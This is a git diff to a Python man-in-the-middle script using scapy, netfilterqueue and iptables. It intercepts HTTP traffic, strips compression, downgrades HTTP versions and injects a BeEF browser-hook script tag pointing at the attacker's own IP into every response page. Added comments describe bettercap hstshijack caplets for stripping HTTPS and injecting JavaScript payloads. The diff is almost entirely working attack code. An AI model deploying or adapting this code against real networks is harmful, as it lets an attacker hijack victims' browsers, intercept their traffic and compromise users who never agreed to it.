@@ -5,6 +5,18 @@
 # apt-get install beef-xss
 # beef start
 # <script src="http://[ip]:3000/hook.js"></script>
+# arp_spoof.py after beef start, otherwise get_mac() will get a IndexError
+
+# only work with http
+# https --> ssl strip, downgrade to http
+# modify [caplet -/usr/local/share/bettercap/caplets/hstshijack]
+# set hstshijack.payloads *:/root/alert.js 
+# bettercap -iface eth0 -caplet /root/arp-spoof.cap
+# hstshijack/hstshijack
+
+# bettercap -iface eth0 -caplet hstshijack/hstshijack
+# need to use modify_iptables_local
+# dport/sport --> 8080
 
 import netfilterqueue
 import subprocess
@@ -12,6 +24,7 @@ import optparse
 import scapy.all as scapy
 from scapy.error import ScapyFreqFilter
 import re
+import socket
 
 def modify_iptables_remote(queue_num):
     # modify iptables to trap all packets in NetFilterQueue(0)
@@ -47,6 +60,16 @@ def set_load(packet, load):
     del packet[scapy.TCP].chksum
     return packet
 
+def get_ip_address():
+    # create a UDP which includes host IP, extract IP from the UDP
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(('8.8.8.8', 80))
+        ip = s.getsockname()[0]
+    finally:
+        s.close()
+    return ip
+
 def process_packet(packet):
     # convert to scapy packet
     scapy_packet = scapy.IP(packet.get_payload())
@@ -56,7 +79,7 @@ def process_packet(packet):
         try:
             load = scapy_packet[scapy.Raw].load.decode()
 
-            if scapy_packet[scapy.TCP].dport == 80:
+            if scapy_packet[scapy.TCP].dport == 80 or scapy_packet[scapy.TCP].dport == 8080:
                 print("[+] HTTP Request")
                 
                 # Accept-Encoding: gzip, deflate --> compress html
@@ -64,12 +87,16 @@ def process_packet(packet):
                 # Accept-Encoding:.*?\\r\\n --> ? = not greedy, \\r = \r
                 load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
 
-            elif scapy_packet[scapy.TCP].sport == 80:
+                # http 1.1 support chunked data transfer, not specify content-length
+                load = load.replace("HTTP/1.1", "HTTP/1.0")
+
+            elif scapy_packet[scapy.TCP].sport == 80 or scapy_packet[scapy.TCP].sport == 8080:
                 print("[+] HTTP Response")
  
                 # injection_code = "<script>alert('test');</script>"
                 # need to be MITM
-                injection_code = '<script src="http://[本机IP]:3000/hook.js"></script>'
+                host_ip = get_ip_address()
+                injection_code = '<script src="http://' + host_ip + ':3000/hook.js"></script>'
                 
                 # load is a str --> replace()
                 # replace </body> at the end of html will not affect showing pages, and only occur once
@@ -99,7 +126,8 @@ def process_packet(packet):
     packet.accept()
 
 options = get_arguments()
-modify_iptables_local(options.queue_num)
+# modify_iptables_local(options.queue_num)
+modify_iptables_remote(options.queue_num)
 queue = netfilterqueue.NetfilterQueue()
 queue.bind(int(options.queue_num), process_packet)
 try:
